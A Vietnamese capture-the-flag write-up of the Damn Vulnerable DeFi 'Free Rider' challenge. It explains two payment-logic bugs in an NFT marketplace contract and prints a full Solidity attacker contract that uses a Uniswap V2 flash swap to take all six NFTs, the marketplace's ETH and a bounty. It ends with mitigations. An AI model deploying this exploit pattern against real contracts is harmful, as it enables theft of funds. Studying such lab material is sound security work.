---
title: "[DVD-11] Free Rider: mua 6 NFT “miễn phí” nhờ lỗi thanh toán sai chủ và msg.value không được trừ"
description: "FreeRiderNFTMarketplace có hai lỗi cộng hưởng: _buyOne() trả tiền cho token.ownerOf() sau khi NFT đã chuyển sang tay người mua (nên người mua được trả lại tiền), và buyMany() kiểm tra msg.value < priceToPay với cùng một msg.value không bao giờ bị trừ. Player chỉ có 0,1 ETH nên phải flash swap 15 ETH từ Uniswap V2."
pubDate: 2026-08-27
tags: ["web3", "ctf", "smart-contract", "damn-vulnerable-defi", "price-logic"]
draft: true
challenge: "damn-vulnerable-defi"
difficulty: "medium"
series: "damn-vulnerable-defi"
---

## Tóm tắt

Free Rider là bài về lỗi logic thanh toán trong một NFT marketplace. `_buyOne()` chuyển NFT cho người mua **trước**, rồi mới trả tiền cho `token.ownerOf(tokenId)` — nhưng lúc này owner đã là người mua, nên marketplace tự trả lại tiền cho chính người mua. Cộng với việc `buyMany()` kiểm tra `msg.value` bằng một giá trị không bao giờ giảm đi qua từng vòng lặp, kẻ tấn công chỉ cần nộp **một lần 15 ETH** để mua đủ 6 NFT (giá mỗi chiếc 15 ETH) và nhận lại 90 ETH. Player chỉ có 0,1 ETH nên vốn được mượn qua một flash swap Uniswap V2, sau đó thu bounty 45 ETH từ recovery manager.

## Bối cảnh & Mục tiêu

- **FreeRiderNFTMarketplace** (`src/free-rider/FreeRiderNFTMarketplace.sol`) — marketplace chứa 6 NFT (tokenId 0–5), mỗi chiếc rao bán 15 ETH, tổng ETH trong contract 90 ETH.
- **FreeRiderRecoveryManager** (`src/free-rider/FreeRiderRecoveryManager.sol`) — contract giữ bounty 45 ETH; nhận NFT qua `onERC721Received`, khi nhận đủ 6 chiếc thì trả bounty cho địa chỉ được mã hóa trong `_data` của lần chuyển thứ 6. Kiểm tra `tx.origin == beneficiary` (chính là player) và `tokenId <= 5`.
- **Uniswap V2 pair** WETH/DVT (9000/15000) — nguồn flash swap lấy vốn tạm.

Trạng thái ban đầu (`test/free-rider/FreeRider.t.sol`): player chỉ có **0,1 ETH**; recoveryManager giữ 45 ETH bounty; marketplace giữ 90 ETH và 6 NFT.

Điều kiện thắng (`_isSolved()`, dòng 201–216): recoveryManagerOwner rút được cả 6 NFT từ recovery manager; marketplace mất hết NFT (`offersCount == 0`) và hao hụt ETH; player phải có balance **lớn hơn 45 ETH** (bounty); recoveryManager rỗng.

## Phân tích lỗ hổng

Hàm mua từng NFT (`src/free-rider/FreeRiderNFTMarketplace.sol:91-111`):

```solidity
function _buyOne(uint256 tokenId) private {
    uint256 priceToPay = offers[tokenId];
    if (priceToPay == 0) {
        revert TokenNotOffered(tokenId);
    }

    if (msg.value < priceToPay) {
        revert InsufficientPayment();
    }

    --offersCount;

    // transfer from seller to buyer
    DamnValuableNFT _token = token; // cache for gas savings
    _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

    // pay seller using cached token
    payable(_token.ownerOf(tokenId)).sendValue(priceToPay);

    emit NFTBought(msg.sender, tokenId, priceToPay);
}
```

Hai lỗi độc lập, cộng hưởng với nhau:

1. **Trả tiền sai chủ.** `safeTransferFrom` di chuyển NFT sang `msg.sender` (người mua) trước, sau đó `_token.ownerOf(tokenId)` — vốn được dùng để xác định "seller" — giờ trả về **chính người mua**. Comment "pay seller using cached token" gây hiểu lầm: contract cache `_token` (địa chỉ NFT) chứ không cache `seller`. Kết quả: marketplace chuyển `priceToPay` cho người mua, tức hoàn lại tiền người mua vừa nộp.
2. **`msg.value` không bao giờ giảm.** `buyMany()` (dòng 83–89) lặp `_buyOne()` với cùng `msg.value` ban đầu; mỗi vòng kiểm tra `msg.value < priceToPay` với cùng con số 15 ETH. Nộp 15 ETH một lần là đủ để vượt qua kiểm tra cho **tất cả** 6 NFT.

Về mặt kinh tế: nộp 15 ETH → nhận 6 NFT → marketplace trả lại 6 × 15 = 90 ETH. Player cần 15 ETH tiền mặt để khởi động, trong khi chỉ có 0,1 ETH — vì vậy cần flash swap. Recovery manager yêu cầu `tx.origin == beneficiary` nên toàn bộ giao dịch phải do player khởi xướng (player gọi contract tấn công trực tiếp).

## Khai thác

Contract `FreeRiderAttacker` (test/free-rider/FreeRider.t.sol:21-80) thực hiện mọi thứ trong một giao dịch:

```solidity
function attack(uint256 nftPrice) external {
    pair.swap(nftPrice, 0, address(this), abi.encode(nftPrice)); // flash swap 15 WETH
}

function uniswapV2Call(address, uint256, uint256, bytes calldata data) external {
    require(msg.sender == address(pair));
    uint256 borrowed = abi.decode(data, (uint256));

    weth.withdraw(borrowed); // WETH -> ETH

    uint256[] memory ids = new uint256[](6);
    for (uint256 i = 0; i < 6; i++) ids[i] = i;
    marketplace.buyMany{value: borrowed}(ids); // nộp 15 ETH, mua 6 NFT, nhận lại 90 ETH

    uint256 repay = borrowed + (borrowed * 3) / 997 + 1; // trả nợ flash swap (fee 0,3%)
    weth.deposit{value: repay}();
    weth.transfer(address(pair), repay);

    for (uint256 i = 0; i < 6; i++) {
        nft.safeTransferFrom(address(this), address(recoveryManager), i, i == 5 ? abi.encode(player) : bytes(""));
    }

    payable(player).transfer(address(this).balance); // gom lợi nhuận còn lại về player
}
```

Diễn tiến:

1. `pair.swap(15e18, 0, ...)` mượn 15 WETH từ Uniswap V2 (flash swap qua callback `uniswapV2Call`).
2. Rút WETH thành ETH, gọi `buyMany{value: 15 ETH}([0..5])`. Mỗi NFT: chuyển vào tay attacker rồi marketplace trả 15 ETH cho attacker. Kết thúc: attacker có 6 NFT + 90 ETH, marketplace mất sạch hàng và tiền.
3. Trả nợ flash swap: 15 ETH + fee ≈ 15,045 ETH, đổi WETH rồi chuyển về pair.
4. Chuyển 6 NFT cho recoveryManager; lần cuối kèm `data = abi.encode(player)`. `tx.origin == player` (player là người gọi `attack()`), tokenId 0–5 hợp lệ, đủ 6 chiếc → recoveryManager trả bounty **45 ETH** cho player.
5. Số dư còn lại trong contract cũng được đẩy về player: tổng lợi nhuận ≈ 90 − 15,045 + 45 ≈ 120 ETH.

## Kết quả

Chạy `forge test --match-path test/free-rider/FreeRider.t.sol`:

```
Ran 2 tests for test/free-rider/FreeRider.t.sol:FreeRiderChallenge
[PASS] test_assertInitialState() (gas: 82130)
[PASS] test_freeRider() (gas: 944884)
Suite result: ok. 2 passed; 0 failed; 0 skipped
```

## Bài học & Cách phòng tránh

- **Cache địa chỉ seller trước khi chuyển tài sản, không query lại sau khi state đã đổi.** Quy tắc vàng: mọi tham chiếu tới owner/beneficiary phải được chốt (snapshot) trước khi thực hiện chuyển NFT, rồi dùng giá trị đã chốt để thanh toán — hoặc dùng mô hình pull-payment (seller tự rút tiền) thay vì push.
- **Giảm `msg.value` qua từng vòng lặp** hoặc kiểm tra tổng: `require(msg.value >= totalPrice)` tính cộng dồn trước vòng lặp; tuyệt đối không so sánh từng phần với cùng một giá trị.
- **Kiểm tra "checks-effects-interactions" cho đúng thứ tự:** trong `_buyOne`, thứ tự đúng là đọc giá → trừ `msg.value` → chuyển NFT → trả tiền cho seller đã cache. Bất kỳ phép đọc state nào xen giữa các bước chuyển tài sản đều là điểm chết người.

## Tham khảo

- Challenge: [Free Rider — Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/challenges/free-rider)
- Source: `src/free-rider/FreeRiderNFTMarketplace.sol`, `src/free-rider/FreeRiderRecoveryManager.sol`, `test/free-rider/FreeRider.t.sol`
